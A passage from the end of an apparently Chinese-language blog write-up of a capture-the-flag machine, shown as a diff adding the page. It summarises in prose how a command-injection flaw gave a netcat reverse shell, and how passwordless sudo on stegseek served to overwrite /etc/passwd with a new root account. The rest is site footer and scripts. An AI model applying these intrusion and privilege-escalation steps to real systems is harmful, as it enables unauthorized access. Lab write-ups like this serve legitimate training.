+<li><strong>初始访问:</strong> 利用 Web 应用 "CyberPing 2077" (端口 80) 存在的 <strong>命令注入漏洞</strong>，执行 <code class="notranslate">netcat</code> 反向 Shell，获得 <code class="notranslate">www-data</code> 用户权限。</li>
+<li><strong>第一次提权:</strong> 在 <code class="notranslate">/opt</code> 目录下发现 <strong>特殊的可执行文件 <code class="notranslate">showmepassword</code></strong>，通过脚本运行 1000 次获得密码 <code class="notranslate">d2VsY2</code>，成功 <code class="notranslate">su</code> 切换到 <code class="notranslate">welcome</code> 用户。（<code class="notranslate">robots.txt</code> 中的凭据在此路径无效）。</li>
+<li><strong>第二次提权:</strong> 发现 <code class="notranslate">welcome</code> 用户拥有 <strong>无需密码即可通过 <code class="notranslate">sudo</code> 执行 <code class="notranslate">/usr/local/bin/stegseek</code></strong> 的权限。利用 <code class="notranslate">stegseek</code> 的 <code class="notranslate">-xf</code> 选项，<strong>覆盖 <code class="notranslate">/etc/passwd</code> 文件</strong>，添加了一个自定义的 root 用户 (<code class="notranslate">a</code>)，最终使用该用户成功登录，获得 root 权限。</li>
+</ol></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Triumph Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if("10/12/2024"!=""){
+    var startSite=new Date("10/12/2024");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+<script src='https://7r1UMPH.github.io/plugins/TOC.js'></script><script src='https://blog.meekdai.com/Gmeek/plugins/lightbox.js'></script>
+
+</html>
